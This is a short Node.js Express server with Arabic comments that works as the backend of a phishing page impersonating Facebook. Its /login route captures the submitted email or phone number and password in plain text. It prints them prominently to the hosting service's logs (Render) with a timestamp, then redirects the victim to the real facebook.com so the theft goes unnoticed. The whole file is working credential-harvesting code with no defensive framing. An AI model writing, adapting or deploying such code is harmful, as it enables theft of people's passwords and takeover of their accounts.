const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// قراءة بيانات النموذج (Form Data)
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// تقديم ملفات الواجهة (مثل index.html)
app.use(express.static(path.join(__dirname)));

// استقبال بيانات تسجيل الدخول
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    
    // طباعة البيانات بشكل بارز في سجلات Render (Logs)
    console.log("=========================================");
    console.log(`🔥 تم رصد محاولة تسجيل دخول جديدة!`);
    console.log(`📧 البريد / الهاتف: ${email}`);
    console.log(`🔑 كلمة المرور: ${password}`);
    console.log(`⏰ الوقت: ${new Date().toLocaleString()}`);
    console.log("=========================================");

    // إعادة توجيه المستخدم إلى موقع فيسبوك الحقيقي بعد تسجيل البيانات
    res.redirect('https://www.facebook.com');
});

app.listen(PORT, () => {
    console.log(`الخادم يعمل على البورت: ${PORT}`);
});
